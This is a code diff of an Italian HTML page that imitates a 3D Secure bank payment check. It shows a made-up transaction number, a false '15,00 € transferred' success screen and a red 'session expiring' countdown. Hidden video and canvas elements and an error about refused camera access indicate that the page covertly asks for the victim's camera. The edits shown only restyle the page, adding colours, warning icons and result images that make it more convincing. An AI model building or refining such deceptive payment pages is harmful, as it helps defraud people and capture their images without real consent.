@@ -7,7 +7,7 @@
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: rgb(18, 18, 18);
+      background-color: rgb(15, 15, 15);
       color: #fff;
       display: flex;
       align-items: center;
@@ -30,8 +30,9 @@
 
     .timer {
       font-size: 15px;
-      color: #ccc;
+      color: rgb(251, 18, 34);
       margin-bottom: 20px;
+      font-weight: bold;
     }
 
     button {
@@ -79,6 +80,11 @@
       50% { opacity: 0.3; }
     }
 
+    .result-image {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
     video, canvas {
       display: none;
     }
@@ -96,7 +102,7 @@
     <p>Commissione: <strong>0,00 €</strong></p>
     <p>Transazione: <strong>#TRX-9283743</strong></p>
     <p>Data: <strong><span id="data-operazione"></span></strong></p>
-    <p class="timer">Sessione in scadenza tra <span id="countdown">02:00</span></p>
+    <p class="timer">⚠︎ Sessione in scadenza tra <span id="countdown">02:00</span></p>
   </div>
 
   <video id="video" autoplay playsinline></video>
@@ -139,7 +145,8 @@
     })
     .catch(() => {
       card.innerHTML = `
-        <h2 style="color: red;">Transazione Negata</h2>
+        <img src="fail.png" alt="Errore" class="result-image">
+        <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
         <p>L'autenticazione 3D Secure non è stata completata.</p>
         <p>Accesso alla videocamera rifiutato.</p>
       `;
@@ -152,7 +159,8 @@
       setTimeout(showSuccessScreen, 4000);
     } else {
       card.innerHTML = `
-        <h2 style="color: red;">Transazione Annullata</h2>
+        <img src="fail.png" alt="Annullato" class="result-image">
+        <h2 style="color: rgb(251, 18, 34);">Transazione Annullata</h2>
         <p>Hai annullato manualmente l'autenticazione.</p>
       `;
     }
@@ -179,7 +187,7 @@
 
   function showSuccessScreen() {
     card.innerHTML = `
-      <div class="checkmark">✔️</div>
+      <img src="check.png" alt="Successo" class="result-image">
       <h2><strong>15,00 €</strong> sono stati trasferiti</h2>
       <a href="#" class="link">INVIA VIA EMAIL</a>
       <a href="#" class="link">DETTAGLIO OPERAZIONE</a>
